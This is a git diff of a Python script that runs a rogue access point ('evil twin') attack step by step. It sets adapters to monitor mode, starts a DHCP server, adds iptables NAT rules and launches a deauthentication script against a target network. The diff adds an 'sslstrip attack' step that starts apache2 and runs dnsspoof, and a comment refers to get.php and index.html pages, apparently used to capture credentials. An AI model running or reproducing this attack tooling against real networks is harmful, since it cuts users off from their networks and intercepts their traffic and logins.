@@ -1,5 +1,5 @@
 import os
-import subprocess
+import sys
 import time
 
 
@@ -14,8 +14,9 @@ if __name__ == '__main__':
     os.system('iwconfig')
     monitor_interface1 = input("enter the first wireless adapter’s name to insert to monitor mode")
     monitor_interface2 = input("enter the second wireless adapter’s name to insert to monitor mode")
-    change2monitor(monitor_interface2)
     change2monitor(monitor_interface1)
+    time.sleep(1)
+    change2monitor(monitor_interface2)
     os.system('iwconfig')
     time.sleep(5)
     ##------------------------ step 2 scan sets -----------------------------------------------------##
@@ -49,7 +50,7 @@ if __name__ == '__main__':
 
     os.system("gnome-terminal -x python3 run_DHCP_server.py")
 
-    ##------------------------ step 5 iptables ---------------------------------------##
+    ##-------------------------------- step 5 iptables ---------------------------------------##
     os.system('iwconfig')
     internet_connection = input("enter name of the virtual wireless adapter that is connected to the internet")
     os.system('iptables --table nat --append POSTROUTING --out-interface ' + internet_connection + ' -j MASQUERADE')
@@ -60,5 +61,10 @@ if __name__ == '__main__':
     os.system("gnome-terminal -x python3 my_deauth.py " + target_AP_BSSID + " " + monitor_interface1 + " " + target_AP_name)
     # os.system("python3 my_deauth.py " + target_AP_BSSID + " " + monitor_interface1 + " " + target_AP_name)
 
+    ##------------------------ step 7 sslstrip attack ----------------------------------------##
+    os.system("service apache2 start")
+    os.system("dnsspoof -i wlan2 -f dnsspoof")
+
+    #move get.php and index.html to the comp folder##########
     while True:
         time.sleep(5)
